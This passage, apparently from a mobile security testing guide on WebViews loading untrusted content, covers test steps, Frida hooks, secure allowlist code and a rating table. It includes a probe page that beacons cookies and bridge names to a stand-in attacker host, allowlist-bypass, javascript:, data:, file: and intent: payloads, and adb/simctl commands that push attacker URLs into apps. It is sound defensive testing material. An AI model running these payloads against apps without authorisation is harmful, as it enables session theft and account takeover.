- For confirmation: a simulator build or a jailbroken device with Frida.

#### Steps

1. **List the load call sites.** In radare2, find the selector references and their cross-references:

   ```text
   e asm.bytes=false
   e scr.color=false
   ?e WebView load selectors:
   f~loadRequest:,loadHTMLString,loadFileURL,loadData:MIMEType,loadFileRequest,loadSimulatedRequest
   ?e xrefs (repeat for each reloc address printed above):
   axt @ <reloc address>
   ```

   ```bash
   r2 -q -i load_webview.r2 -A ipa/Payload/App.app/App > load-sites.txt
   ```

2. **List the input entry points** in the same binary, and their cross-references:

   ```text
   f~openURL,openURLContexts,continueUserActivity,didReceiveNotificationResponse,didReceiveRemoteNotification
   ```

   These are `application(_:open:options:)`, `scene(_:openURLContexts:)`, `application(_:continue:restorationHandler:)` and `scene(_:continue:)` (universal links), and the notification handlers. SwiftUI apps handle URLs in `.onOpenURL` closures, which do not have readable selectors; search for `onOpenURL` in the symbols (`afl~onOpenURL`) and follow the closure. Also note remote-config and API model classes with fields like `url`, `link`, `redirect`, `help_url`.

3. **Trace from entry point to sink.** For each load call site, work backwards from the argument (MASTG-TECH-0076): which function built the `URL`, from which string, and was the string a query item (`URLComponents.queryItems`), a path component, a notification `userInfo` value or a decoded JSON field? Note any validation on the way: `URLComponents` scheme and host checks (good), `hasPrefix`/`contains` on `absoluteString` (weak), none (fail).

4. **Review the navigation delegate.** Find classes implementing `webView:decidePolicyForNavigationAction:decisionHandler:` (`f~decidePolicyForNavigationAction`) and read the decision logic: is the URL's scheme and host checked, is `.allow` the fallback, are subframes and new windows handled? Check `WKAppBoundDomains` in Info.plist and `limitsNavigationsToAppBoundDomains` in the binary.

5. **Review templating in local HTML.** For `loadFileURL`/`loadHTMLString` with app-built HTML, look for HTML or JavaScript that inserts URL parameters or app data unsafely:

   ```bash
   grep -rnE 'innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(' ipa/Payload/App.app --include='*.html' --include='*.js'
   ```

   and in the binary with r2 (`/ innerHTML`), since templates are often string literals.

6. **Confirm dynamically** by sending a crafted URL through the entry point and watching what loads, with the hooks from GT-0035-1:

   ```bash
   xcrun simctl openurl booted 'example://web?url=https%3A%2F%2Fattacker.example.net%2Fprobe.html'
   ```

#### Observation

The list of load call sites with the function each one is in, the input that reaches each one and how it is processed on the way, the navigation-delegate logic, and the app-bound domain configuration.

#### Evaluation

The test **fails** if any `WKWebView` load API receives a URL or content derived from attacker-controlled input without validation that restricts it to expected schemes, hosts and paths, or if attacker input reaches the rendered page in a way that is interpreted as HTML or script (`innerHTML`, string-built `evaluateJavaScript`). It **passes** if external input only selects among fixed destinations, or is parsed with `URLComponents` and checked for `https` and an exact host before loading, and a navigation delegate (or `limitsNavigationsToAppBoundDomains`) enforces the same rule for later navigations.

#### Demo

[MASTG-DEMO-0095](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0095/MASTG-DEMO-0095/). The app writes an HTML page to Documents, appends a user-supplied `username` to its URL and loads it; the page puts the parameter into the DOM with `innerHTML`:

```swift
let urlWithUsername = URL(string: "\(fileURL.absoluteString)?username=\(username)")   // unvalidated
let webView = WKWebView()
webView.loadFileURL(urlWithUsername!, allowingReadAccessTo: docDir)
```

```javascript
const name = new URLSearchParams(window.location.search).get('username');
document.getElementById('username').innerHTML = name;   // markup, not text
```

`<script>` tags inserted through `innerHTML` do not execute, but event handlers and meta refresh do, so payloads such as `<img src=x onerror="window.location='https://attacker.example.net'">` or `<meta http-equiv="refresh" content="1; url=https://attacker.example.net">` navigate the WebView to the attacker's site (the WebView has no navigation delegate to stop it). radare2 locates the sink and the template:

```text
Uses of loadRequest or loadFileURL:
0x10000c0ff 37 str.loadFileURL:allowingReadAccessToURL:
0x100018118 8 reloc.fixup.loadFileURL:allowingReadAccessT

xrefs to 'loadFileURL' selector
sym.MASTestApp.MastgTest.showHtmlRegistrationView...username.completion 0x100004f10 [DATA:r--] ldr x1, reloc.fixup.loadFileURL:allowingReadAccessT
HTML template string (contains innerHTML injection):
0x10000b261 hit4_0 "yId('username').innerHTML = name;</scrip"
```

The disassembly of the closure shows `absoluteString` of the file URL, the inline constant `?username=` and the attacker value appended with no encoding, then `URL(string:)` and `objc_msgSend` with `loadFileURL:allowingReadAccessToURL:` at `0x100004f20`, with the Documents directory as the read-access scope. The test fails. OWASP's fix replaces `innerHTML` with `textContent`; the URL construction (no percent-encoding of the parameter) and the broad read access (see MASTG-TEST-0333 in the [MASWE-0034 note](/mobile/maswe-0034-webviews-allow-access-to-local-resources/)) remain issues.

### GT-0035-1: Driving every WebView load input with an attacker URL (Android and iOS)

Guler Tech methodology. Platform: Android and iOS. Type: dynamic (hooks, IPC, network), with a static first step. This restores the dynamic half of legacy tests MASTG-TEST-0027 and 0076 and covers the Android `loadUrl` path that no current OWASP test does.

#### Overview

Static review tells you which inputs *might* reach a load call. This procedure proves which ones *do*, with what validation, and what an attacker gets. For each input you send an attacker-controlled URL (and the bypass variants), record what the WebView actually loaded with hooks on the load APIs and the navigation callbacks, and record what the attacker's page could see. A hostile page that renders inside the app, with the app's cookies, bridges or file access, is the finding; the rest is supporting evidence.

#### Prerequisites

- An attacker host you control on the lab network or the internet, reachable from the device, serving a probe page over HTTPS with a publicly trusted certificate (so that certificate validation is not the reason a load fails). We use `attacker.example.net` below; substitute yours. For allowlist bypasses that need a hostname like `example.com.attacker.example.net`, use a wildcard DNS record on your domain.
- The interception proxy from our [interception lab](/mobile/mobile-traffic-interception-lab/) to see requests and to rewrite server responses.
- Android: rooted device or emulator with frida-server; iOS: jailbroken device with frida-server, or a simulator build for `simctl` steps ([Frida (iOS), MASTG-TOOL-0039](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0039/)).
- The WebView and input map from [Before you start](#before-you-start-map-the-webviews-and-their-inputs), plus the deep-link inventory from the [MASWE-0029 note](/mobile/maswe-0029-insecure-deep-links/).
- A logged-in test account, so that you can see whether session material is exposed.

#### Steps

1. **List every input that reaches a load call.** From the static map, write one row per (input, sink) pair. Typical inputs:

   | Input | Android source | iOS source |
   |---|---|---|
   | Explicit intent / deep link / App Link / universal link | `getIntent().getStringExtra(..)`, `getData()`, `getQueryParameter(..)`, `onNewIntent` | `application(_:open:options:)`, `scene(_:openURLContexts:)`, `scene(_:continue:)`, `.onOpenURL` |
   | Push notification payload | `FirebaseMessagingService.onMessageReceived` → `RemoteMessage.getData()`, extras of the notification's `PendingIntent` | `userNotificationCenter(_:didReceive:withCompletionHandler:)` → `userInfo` |
   | Server configuration and API responses | Remote-config getters, JSON model fields (`url`, `link`, `redirect`) | Same |
   | User input | URL field, QR scanner, pasted text | Same |
   | Content inside an allowed page | Links, redirects, user-generated content on an allowed domain | Same |

2. **Prepare the probe page and the URL set.** The probe reports what it can see to your server:

   ```text
   <!doctype html>
   <meta name="viewport" content="width=device-width">
   <pre id="out">probe</pre>
   <script>
     const r = {
       href: location.href, origin: location.origin, referrer: document.referrer,
       cookie: document.cookie, ua: navigator.userAgent,
       // names of objects injected by addJavascriptInterface show up as window properties
       bridges: Object.getOwnPropertyNames(window).filter(k => /bridge|native|android|app|js/i.test(k)),
       webkitHandlers: !!(window.webkit && window.webkit.messageHandlers)
     };
     document.getElementById('out').textContent = JSON.stringify(r, null, 2);
     navigator.sendBeacon('/beacon', JSON.stringify(r));
   </script>
   ```

   Also test the names of bridge objects found statically, for example `typeof window.AppBridge`. Then build the URL set for each input, URL-encoded where it goes into a query parameter:

   ```text
   https://attacker.example.net/probe.html
   http://attacker.example.net/probe.html
   https://example.com.attacker.example.net/probe.html
   https://example.com@attacker.example.net/probe.html
   https://attacker.example.net/probe.html?https://example.com/
   https://attacker.example.net\@example.com/probe.html
   https://attackerexample.com/probe.html           (only if you control such a name)
   https://EXAMPLE.COM.attacker.example.net/probe.html
   https://example.com/<open-redirect-path>?to=https://attacker.example.net/probe.html
   javascript:alert(document.domain)
   javascript://example.com/%0aalert(document.domain)
   data:text/html,<script>alert(document.domain)</script>
   file:///data/data/com.example.app/shared_prefs/      (Android; see MASWE-0034)
   intent://x#Intent;component=com.example.app/.internal.DebugActivity;end   (Android; see MASWE-0032)
   ```

3. **Start the hooks.** On Android, `wvc-trace.js` from MASTG-TEST-0400 for the navigation callbacks, plus this script for the loads that bypass them:

   ```javascript
   // wv-load-trace.js
   Java.perform(() => {
     const WebView = Java.use('android.webkit.WebView');
     const Log = Java.use('android.util.Log');
     const Exception = Java.use('java.lang.Exception');
     const stack = () => Log.getStackTraceString(Exception.$new()).split('\n').slice(2, 8).join('\n');

     WebView.loadUrl.overloads.forEach(o => {
       o.implementation = function (url, headers) {
         const h = (arguments.length > 1 && headers !== null) ? `  headers=${headers.toString()}` : '';
         console.log(`\n[loadUrl] ${url}${h}\n${stack()}`);
         return o.apply(this, arguments);
       };
     });
     WebView.postUrl.implementation = function (url, body) {
       console.log(`\n[postUrl] ${url} (${body.length} bytes)\n${stack()}`);
       return this.postUrl(url, body);
     };
     WebView.loadDataWithBaseURL.implementation = function (base, data, mime, enc, hist) {
       console.log(`\n[loadDataWithBaseURL] baseUrl=${base} mime=${mime} data=${String(data).slice(0, 200)}\n${stack()}`);
       return this.loadDataWithBaseURL(base, data, mime, enc, hist);
     };
     WebView.loadData.implementation = function (data, mime, enc) {
       console.log(`\n[loadData] mime=${mime} data=${String(data).slice(0, 200)}\n${stack()}`);
       return this.loadData(data, mime, enc);
     };
     WebView.evaluateJavascript.implementation = function (js, cb) {
       console.log(`\n[evaluateJavascript] ${String(js).slice(0, 200)}\n${stack()}`);
       return this.evaluateJavascript(js, cb);
     };
   });
   ```

   ```bash
   frida -U -f com.example.app -l wvc-trace.js -l wv-load-trace.js -o android-run.log
   ```

   On iOS, this script logs every `WKWebView` load with its arguments and a backtrace, and every navigation decision made by the app's delegates:

   ```javascript
   // wk-trace.js
   const bt = ctx => Thread.backtrace(ctx, Backtracer.ACCURATE).slice(0, 8).map(DebugSymbol.fromAddress).join('\n    ');
   const str = p => (p.isNull() ? 'nil' : new ObjC.Object(p).toString());
   const reqUrl = p => new ObjC.Object(p).URL().absoluteString().toString();

   const WK = ObjC.classes.WKWebView;
   const loads = {
     '- loadRequest:': a => `request=${reqUrl(a[2])}`,
     '- loadHTMLString:baseURL:': a => `html(${new ObjC.Object(a[2]).length()} chars) baseURL=${str(a[3])}`,
     '- loadData:MIMEType:characterEncodingName:baseURL:': a => `data(${new ObjC.Object(a[2]).length()} bytes) type=${str(a[3])} baseURL=${str(a[5])}`,
     '- loadFileURL:allowingReadAccessToURL:': a => `file=${str(a[2])} readAccess=${str(a[3])}`,
     '- loadFileRequest:allowingReadAccessToURL:': a => `file=${reqUrl(a[2])} readAccess=${str(a[3])}`,
     '- loadSimulatedRequest:responseHTMLString:': a => `simulated=${reqUrl(a[2])}`
   };
   for (const sel in loads) {
     const m = WK[sel];
     if (!m) continue;
     Interceptor.attach(m.implementation, {
       onEnter(args) { console.log(`\n[WKWebView ${sel}] ${loads[sel](args)}\n    ${bt(this.context)}`); }
     });
   }

   // Navigation delegates (the app's and any SDK's)
   const POLICY = ['cancel', 'allow', 'download'];
   const seenInvoke = new Set();
   new ApiResolver('objc').enumerateMatches('-[* webView:decidePolicyForNavigationAction:*decisionHandler:]').forEach(match => {
     const withPrefs = match.name.includes('preferences:');
     Interceptor.attach(match.address, {
       onEnter(args) {
         const action = new ObjC.Object(args[3]);
         const frame = action.targetFrame();
         const where = frame === null ? 'new window' : (frame.isMainFrame() ? 'main frame' : 'subframe');
         console.log(`\n[${match.name}]\n    url=${reqUrl(action.request().handle)} type=${action.navigationType()} ${where}`);
         // The decision handler is a block; hook its invoke function to log the policy passed to it
         const block = withPrefs ? args[5] : args[4];
         const invoke = block.add(Process.pointerSize * 2).readPointer().strip();
         if (!seenInvoke.has(invoke.toString())) {
           seenInvoke.add(invoke.toString());
           Interceptor.attach(invoke, { onEnter(a) { console.log(`    -> decision: ${POLICY[a[1].toInt32()] || a[1]}`); } });
         }
       }
     });
   });
   ```

   ```bash
   frida -U -n 'Example App' -l wk-trace.js -o ios-run.log    # attach once the app is running
   ```

   If `ObjC.classes.WKWebView` is undefined when you spawn with `-f`, WebKit is not loaded yet: attach after launch instead. Navigation types are `0` link, `1` form submit, `2` back/forward, `3` reload, `4` form resubmit, `-1` other.

4. **Drive each input with each URL.** Record the input, the payload, the hook output, what the screen showed, and what reached your server. The commands per input type:

   ```bash
   # Android: exported activity with a URL extra (no permission needed by a malicious app)
   adb shell am start -W -n com.example.app/.web.WebActivity --es url 'https://attacker.example.net/probe.html'

   # Android: deep link / App Link (what a link on a web page or in a message does)
   adb shell am start -W -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d 'example://web?url=https%3A%2F%2Fattacker.example.net%2Fprobe.html' com.example.app

   # Android: the activity a push notification opens is often not exported; replaying it as root
   # proves the sink, and the attacker position is whoever controls push content
   adb shell su -c "am start -n com.example.app/.push.NotificationActivity --es link 'https://attacker.example.net/probe.html'"
   ```

   ```bash
   # iOS simulator: custom scheme and universal link
   xcrun simctl openurl booted 'example://web?url=https%3A%2F%2Fattacker.example.net%2Fprobe.html'
   xcrun simctl openurl booted 'https://example.com/open?next=https%3A%2F%2Fattacker.example.net%2Fprobe.html'

   # iOS simulator: push payload, with the custom keys the app reads (from static review)
   cat > push.apns <<'JSON'
   { "aps": { "alert": { "title": "Offer", "body": "Tap to open" } },
     "deeplink": "https://attacker.example.net/probe.html" }
   JSON
   xcrun simctl push booted com.example.app push.apns     # then tap the notification
   ```

   On a physical iOS device, put the link on a web page or in a note and tap it, or open it from Frida on the main thread:

   ```javascript
   ObjC.schedule(ObjC.mainQueue, () => {
     const u = ObjC.classes.NSURL.URLWithString_('example://web?url=https%3A%2F%2Fattacker.example.net%2Fprobe.html');
     ObjC.classes.UIApplication.sharedApplication().openURL_options_completionHandler_(u, ObjC.classes.NSDictionary.dictionary(), NULL);
   });
   ```

   For server-supplied URLs, rewrite the response in the proxy instead (mitmproxy's `--modify-body` takes `/filter/regex/replacement`, with any separator character):

   ```bash
   mitmdump --listen-port 8080 \
     --modify-body '|~u /v1/config|https://help\.example\.com/[^"]*|https://attacker.example.net/probe.html'
   ```

   For links inside allowed pages, use content you can control on the allowed domain (a profile field, a comment, a support-chat message) and the `nav-probe.js` approach from MASTG-TEST-0400 (on iOS, `evaluateJavaScript_completionHandler_` on the live `WKWebView` from `ObjC.choose`, scheduled on `ObjC.mainQueue`).

5. **For every load that reached the attacker page, measure the impact.** Read the beacon: does `document.cookie` hold session cookies, are bridge objects present, did `loadUrl` carry an `Authorization` header (look at the request in the proxy), is the referrer leaking a tokenised URL? If bridges are present, the next step is the [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/) procedure; if a `file:` load worked, the [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/) one. Take a screenshot of the page rendered inside the app's UI (`adb exec-out screencap -p > probe.png`; iOS `xcrun simctl io booted screenshot probe.png`).

6. **Clean up**: stop the proxy rewrite, clear the WebView data of the test account (log out, or `adb shell pm clear com.example.app` on a lab device), and remove the probe page.

#### Observation

A table with one row per (input, payload): the hook output showing the load call and its arguments, the navigation-callback decisions, where the URL ended up (rendered in the app's WebView, opened in the browser, Custom Tab or `SFSafariViewController`, blocked, error), the beacon content, and the proxy record of headers sent to the attacker host.

#### Evaluation

| Result for an input | Conclusion |
|---|---|
| Attacker page rendered in the app's WebView, JavaScript running | **Fail** (unvalidated URL or allowlist bypass; name which) |
| As above, and cookies, tokens, bridges or file access visible to the page | **Fail**, rate by what was exposed (see [Rating findings](#rating-findings)) |
| `javascript:` payload executed in the origin of an already-loaded trusted page | **Fail** (script injection into the app's origin) |
| Attacker host received an `Authorization` header, API key or token in the URL | **Fail**, even if the page was then blocked |
| `intent:` payload started an app component | **Fail** (see [MASWE-0032](/mobile/maswe-0032-insecure-intents/)) |
| Opened in the system browser, Custom Tab or `SFSafariViewController` without app credentials | Pass for this input |
| Blocked, error page or app-bound domain failure | Pass for this input |

The test fails for the app if any input that an attacker can reach without your help (a malicious app, a link the user taps, push or server content once compromised, content on an allowed site) produces a fail row.

#### Demo

Illustrative and abridged. An Android app whose `HelpActivity` is exported for a "help" deep link and loads `getIntent().getData().getQueryParameter("page")` with the user's token in a header. Its `WebViewClient` has a correct-looking allowlist in `shouldOverrideUrlLoading`, which never runs for the app's own load:

```text
$ adb shell am start -W -a android.intent.action.VIEW -d 'example://help?page=https%3A%2F%2Fattacker.example.net%2Fprobe.html' com.example.app

[loadUrl] https://attacker.example.net/probe.html  headers={Authorization=Bearer <redacted>}
    at com.example.app.help.HelpActivity.onCreate(HelpActivity.java:48)
    at android.app.Activity.performCreate(Activity.java:8595)

[HelpWebViewClient.shouldInterceptRequest] https://attacker.example.net/probe.html mainFrame=true redirect=false gesture=false method=GET
    inspected: NONE
    -> null (loaded normally)
```

The proxy shows `GET /probe.html` to `attacker.example.net` with the bearer token, and the beacon reports `bridges: ["AppBridge"]`. One tap on a link is enough to take over the account; the fix is to validate in `HelpActivity` before `loadUrl`, map `page` to a fixed set of help articles, and never attach credentials to WebView loads.

## Best practices

OWASP has two best-practice pages for this weakness, both iOS. We add secure patterns for both platforms.

### MASTG-BEST-0032: Migrate from UIWebView to WKWebView

Source: [MASTG-BEST-0032](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0032/). Replace every `UIWebView` with `WKWebView`. You gain out-of-process rendering (a WebKit memory-corruption bug no longer lands in your app's process), the ability to turn JavaScript off per navigation with `WKWebpagePreferences.allowsContentJavaScript`, a real navigation policy through `WKNavigationDelegate`, app-bound domains, and modern web security features such as Content Security Policy. Migration notes from our experience: `UIWebViewDelegate.webView(_:shouldStartLoadWith:navigationType:)` maps to `webView(_:decidePolicyFor:decisionHandler:)` and is asynchronous; `stringByEvaluatingJavaScript(from:)` becomes `evaluateJavaScript(_:completionHandler:)`; cookies move from `HTTPCookieStorage.shared` to `WKWebsiteDataStore.httpCookieStore`; local content must be loaded with `loadFileURL(_:allowingReadAccessTo:)` and a narrow scope. Update or replace SDKs that still reference `UIWebView`; App Store Connect will not accept the binary otherwise.

### MASTG-BEST-0034: Validate WebView Input

Source: [MASTG-BEST-0034](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0034/). Treat everything passed into a `WKWebView` as untrusted unless the app fully controls it: URLs for `load(_:)`, files for `loadFileURL`, HTML for `loadHTMLString`, JavaScript for `evaluateJavaScript`, and any data inserted into the page. In practice:

- Parse URLs with `URLComponents` and check them against a strict allowlist of scheme, host, and where relevant path and port. Never decide on substrings of `absoluteString`.
- For deep links and custom schemes, accept known commands with fixed destinations (`example://help/42` → a URL your code builds), not arbitrary `url=` parameters.
- Render untrusted data as text: `textContent`, not `innerHTML`; pass data to scripts with `callAsyncJavaScript(_:arguments:in:in:completionHandler:)` (iOS 14+), which passes arguments as values instead of concatenating them into source.
- Keep `allowingReadAccessTo` to the smallest directory, and never combine broad file access with HTML that contains untrusted data.

The same rules apply on Android with `Uri` instead of `URLComponents`, and `evaluateJavascript` with JSON-encoded arguments (`JSONObject.quote(value)`) instead of string concatenation.

### Secure patterns for Android and iOS (Guler Tech)

**Android: one allowlist, used before every load and in the navigation callback.**

```kotlin
object WebAllowlist {
    private val hosts = setOf("example.com", "www.example.com", "help.example.com")

    fun isTrusted(uri: Uri?): Boolean {
        if (uri == null || uri.scheme != "https") return false
        if (uri.userInfo != null || uri.port != -1) return false
        if (uri.toString().contains('\\')) return false
        return uri.host?.lowercase(Locale.ROOT) in hosts
    }
}

class AllowlistClient(private val activity: Activity) : WebViewClient() {
    override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
        val uri = request.url
        if (WebAllowlist.isTrusted(uri)) return false                  // stay in the WebView
        if (request.isForMainFrame && (uri.scheme == "https" || uri.scheme == "http")) {
            // ordinary web links go to the browser; never start intent:, file:, javascript: etc.
            runCatching {
                activity.startActivity(Intent(Intent.ACTION_VIEW, uri).addCategory(Intent.CATEGORY_BROWSABLE))
            }
        }
        return true                                                      // block everything else
    }

    @Deprecated("Only needed if minSdk < 24")
    override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean =
        !WebAllowlist.isTrusted(Uri.parse(url))                          // same rule on Android 6 and older
}

// Every load from external input goes through the same check, and carries no credentials
fun WebView.loadTrusted(raw: String?) {
    val uri = raw?.let(Uri::parse)
    if (WebAllowlist.isTrusted(uri)) loadUrl(uri.toString()) else loadUrl("about:blank")
}
```

Add to this: leave Safe Browsing alone; set `setSupportMultipleWindows(false)` unless you need pop-ups, and give any WebView created in `onCreateWindow` the same client; pass untrusted HTML with `loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)` and JavaScript off; serve bundled content with `WebViewAssetLoader`; send session state with cookies scoped to your domain (`CookieManager`, `Secure; HttpOnly; SameSite`) rather than headers on `loadUrl`. If an allowed host can redirect, the main-frame redirect comes back through `shouldOverrideUrlLoading` (`isRedirect()` is `true`) and is checked like any other navigation; make sure nothing in your client short-circuits that. Note that opening `https` links with `ACTION_VIEW` can resolve to your own app if it handles verified App Links for that host; route those internally.

**iOS: decide in the navigation delegate, and limit to app-bound domains where you can.**

```swift
final class AllowlistNavigationDelegate: NSObject, WKNavigationDelegate {
    private let hosts: Set<String> = ["example.com", "www.example.com", "help.example.com"]

    private func isTrusted(_ url: URL?) -> Bool {
        guard let url, let c = URLComponents(url: url, resolvingAgainstBaseURL: false) else { return false }
        return c.scheme == "https" && c.user == nil && c.password == nil && c.port == nil
            && hosts.contains(c.host?.lowercased() ?? "")
    }

    func webView(_ webView: WKWebView,
                 decidePolicyFor navigationAction: WKNavigationAction,
                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        let url = navigationAction.request.url
        if isTrusted(url) {
            decisionHandler(.allow)
            return
        }
        decisionHandler(.cancel)
        if navigationAction.navigationType == .linkActivated, let url, url.scheme == "https" {
            let safari = SFSafariViewController(url: url)               // third-party content, out of the app's WebView
            webView.window?.rootViewController?.present(safari, animated: true)
        }
    }
}

let config = WKWebViewConfiguration()
config.limitsNavigationsToAppBoundDomains = true    // with WKAppBoundDomains in Info.plist (iOS 14+)
config.defaultWebpagePreferences.allowsContentJavaScript = true   // only if the pages need it
let webView = WKWebView(frame: .zero, configuration: config)
webView.navigationDelegate = AllowlistNavigationDelegate()   // keep a strong reference in real code
```

Because `decidePolicyFor` also runs for the app's own `load(_:)`, this one delegate covers deep-link-driven loads as well. If iframes from third parties are expected, allow them deliberately by checking `navigationAction.targetFrame?.isMainFrame == false` against their own short list. Use `loadHTMLString(html, baseURL: nil)` for untrusted HTML, and `ASWebAuthenticationSession` for any third-party sign-in.

## Rating findings

Rate on three things: **who can choose the content** and what they need (a malicious app installed on the device with no permissions, sending an intent; a link the user taps on a web page, in a message or a QR code; a compromised backend, CMS or push console; a network attacker, covered by the [cleartext](/mobile/maswe-0026-cleartext-network-traffic/) and [certificate](/mobile/maswe-0027-insecure-certificate-validation/) notes; content on an allowed site), **what the content gets once it is in** (session cookies or tokens, native bridges, file access, or only the app's frame around it), and **how much user interaction it takes** (none, one tap, a series of steps). A link that opens the app and loads the attacker's page with one tap is a realistic attack for consumer apps; we do not treat the tap as a strong mitigating factor.

| Rating | Conditions |
|---|---|
| **Critical** | An attacker-chosen URL or HTML (via an exported component a no-permission app can call, or a deep link / universal link one tap away) renders in a WebView that exposes **sensitive native bridges**, **reads local files**, or **receives credentials** (an `Authorization` header or token on `loadUrl`/`load`, session cookies readable by script); or `javascript:` input executes in the origin of an authenticated page. Proven with GT-0035-1. |
| **High** | Attacker content renders in the app's WebView with JavaScript but without the above: convincing in-app phishing, access to non-`HttpOnly` cookies or `localStorage` of a trusted origin through `loadDataWithBaseURL`/`loadHTMLString` with the app's base URL, or navigation to an attacker site via an allowlist bypass from an exported entry point. Also `intent:` URLs started without the browsable restrictions, and a `UIWebView` rendering remote or user-influenced content. |
| **Medium** | Unrestricted or weakly restricted navigation that an attacker can only reach through content on a trusted site (an open redirect, user-generated links, a third-party script on an allowed domain), or through a compromised server value; HTML injection in local templates that leads to navigation but not to script in a privileged context; a weak allowlist (`contains`, `startsWith`, missing scheme check) with no entry point found yet but JavaScript and bridges enabled. |
| **Low** | Safe Browsing disabled in the manifest or code, or neutralised by `onSafeBrowsingHit` / broad allowlists, on WebViews that only load the app's own domains; a `UIWebView` reference in an SDK that is never instantiated; diverging `shouldOverrideUrlLoading` overloads affecting only Android versions below 7 that are still in `minSdkVersion`; a `WebViewClient` without restrictions on a WebView that loads only the app's own static pages, with JavaScript off. |
| **Info** | Third-party content opened in Custom Tabs, the browser or `SFSafariViewController`; `WKAppBoundDomains` absent where navigation is already restricted by a correct delegate; recommendations such as moving sign-in to `ASWebAuthenticationSession` or Custom Tabs where no current exposure exists. |

Raise a level when the WebView holds a long-lived session for a high-value account (banking, health, administration) or when the bridge reaches payment or messaging functions. Lower a level when the only reachable entry point needs a compromised backend and the backend is in scope for separate testing, but state that explicitly. Safe Browsing on its own is rarely above Low: it protects against known-bad sites, not against the attacker you are testing for. In the report, give the input, the sink (class and method from jadx, or function and address from r2), the navigation-callback logic, the exact payload that worked, the hook and proxy evidence, the device and OS version, and the fix at the source.

## References

- OWASP MASWE: [MASWE-0035: WebViews Loading Untrusted Content](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0035/); related [MASWE-0029](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0029/), [MASWE-0032](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0032/), [MASWE-0033](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0033/), [MASWE-0034](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0034/) (CC BY-SA 4.0)
- OWASP MASVS: [MASVS-PLATFORM-2](https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-2/), [MASVS-CODE-4](https://mas.owasp.org/MASVS/controls/MASVS-CODE-4/) (CC BY-SA 4.0)
- OWASP MASTG knowledge: [MASTG-KNOW-0018: WebViews (Android)](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/), [MASTG-KNOW-0076: WebViews (iOS)](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/) (CC BY-SA 4.0)
- OWASP MASTG tests: [MASTG-TEST-0398](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0398/), [MASTG-TEST-0399](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0399/), [MASTG-TEST-0400](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0400/), [MASTG-TEST-0331](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0331/), [MASTG-TEST-0332](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0332/); legacy [MASTG-TEST-0027](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0027/), [MASTG-TEST-0076](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/) (CC BY-SA 4.0)
- OWASP MASTG demos: [MASTG-DEMO-0094](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0094/MASTG-DEMO-0094/), [MASTG-DEMO-0095](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0095/MASTG-DEMO-0095/), [MASTG-DEMO-0156](https://mas.owasp.org/MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0156/MASTG-DEMO-0156/), [MASTG-DEMO-0157](https://mas.owasp.org/MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0157/MASTG-DEMO-0157/), [MASTG-DEMO-0158](https://mas.owasp.org/MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0158/MASTG-DEMO-0158/) (CC BY-SA 4.0)
- OWASP MASTG best practices: [MASTG-BEST-0032](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0032/), [MASTG-BEST-0034](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0034/) (CC BY-SA 4.0)
- OWASP MASTG techniques: [MASTG-TECH-0005](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0005/), [MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/), [MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/), [MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/), [MASTG-TECH-0043](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0043/), [MASTG-TECH-0117](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0117/), [MASTG-TECH-0150](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0150/), [MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/), [MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/), [MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/) (CC BY-SA 4.0)
